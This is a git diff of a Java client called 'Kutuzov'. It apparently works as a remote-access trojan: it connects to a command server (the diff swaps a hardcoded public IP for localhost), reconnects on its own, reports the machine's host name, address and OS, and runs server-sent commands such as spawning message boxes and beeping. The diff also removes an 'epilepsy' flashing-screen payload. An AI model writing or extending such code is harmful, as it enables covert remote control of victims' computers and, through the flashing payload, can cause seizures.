@@ -1,5 +1,6 @@
 package me.kutuzov.client;
 
+import com.profesorfalken.jpowershell.OSDetector;
 import com.sun.jna.platform.win32.GDI32;
 import me.kutuzov.client.payloads.Payloads;
 import me.kutuzov.packet.*;
@@ -17,10 +18,11 @@ import java.util.ArrayList;
 import java.util.concurrent.atomic.AtomicReference;
 
 public class KutuzovEntry {
-    public  static final String HOST = "135.125.183.121";
+    public  static final String HOST = "localhost";
     public  static final int    PORT = 33901;
 
     private static Socket socket;
+    private static long lastPing = System.currentTimeMillis();
     public  static void main(String[] args) {
         try {
             socket = new Socket(HOST, PORT);
@@ -28,9 +30,9 @@ public class KutuzovEntry {
             System.out.println("[M0] Connection lost, reconnecting...");
             while (true) {
                 try {
-                    socket = new Socket(HOST, PORT);
                     Thread.sleep(100);
-                    continue;
+                    socket = new Socket(HOST, PORT);
+                    break;
                 } catch (Exception e1) {
                     System.out.println("[M1] Connection lost, reconnecting...");
                 }
@@ -45,9 +47,7 @@ public class KutuzovEntry {
             } catch (IOException e) {}
 
             while(true) {
-                try {
-                    socket.sendUrgentData(0x02);
-                } catch (IOException e) {
+                if(System.currentTimeMillis() - lastPing > 10000) {
                     System.out.println("[W0] Connection lost, reconnecting...");
                     while (true) {
                         try {
@@ -55,6 +55,7 @@ public class KutuzovEntry {
                             socket = new Socket(HOST, PORT);
                             ois = new ObjectInputStream(socket.getInputStream());
                             oos = new ObjectOutputStream(socket.getOutputStream());
+                            lastPing = System.currentTimeMillis();
                             break;
                         } catch (IOException | InterruptedException e1) {
                             System.out.println("[W1] Connection lost, reconnecting...");
@@ -64,7 +65,9 @@ public class KutuzovEntry {
 
                 try {
                     Object packet = ois.readObject();
-                    if(packet instanceof SCMessageBoxPacket) {
+                    if(packet instanceof SCKeepAlivePacket) {
+                        lastPing = System.currentTimeMillis();
+                    } else if(packet instanceof SCMessageBoxPacket) {
                         SCMessageBoxPacket scMessageBoxPacket = (SCMessageBoxPacket) packet;
                         for(int i = 0; i < scMessageBoxPacket.amount; i++)
                             new Thread(() -> JOptionPane.showMessageDialog(null, scMessageBoxPacket.content, scMessageBoxPacket.title, JOptionPane.INFORMATION_MESSAGE)).start();
@@ -98,19 +101,9 @@ public class KutuzovEntry {
                         oos.writeObject(new CSHandshakePacket(identifierName, localHost, os));
                     } else if(packet instanceof SCBeepPacket)
                         Toolkit.getDefaultToolkit().beep();
-                    else if(packet instanceof SCEpilepsyPacket) {
-                        SCEpilepsyPacket scEpilepsyPacket = (SCEpilepsyPacket) packet;
-                        Payloads.epilepsyScreenEnabled.set(true);
-                        try {
-                            Thread.sleep(scEpilepsyPacket.time);
-                        } catch (InterruptedException e) { }
-                        Payloads.epilepsyScreenEnabled.set(false);
-                    }
-                } catch (Exception ignored) {
-                    try {
-                        socket.sendUrgentData(0x02);
-                    } catch (IOException e) {}
-                }
+                      else if(OSDetector.isWindows())
+                        KutuzovWinPackets.handlePacket(ois, oos, (Packet)packet);
+                } catch (Exception ignored) {}
             }
         });
         thread.start();
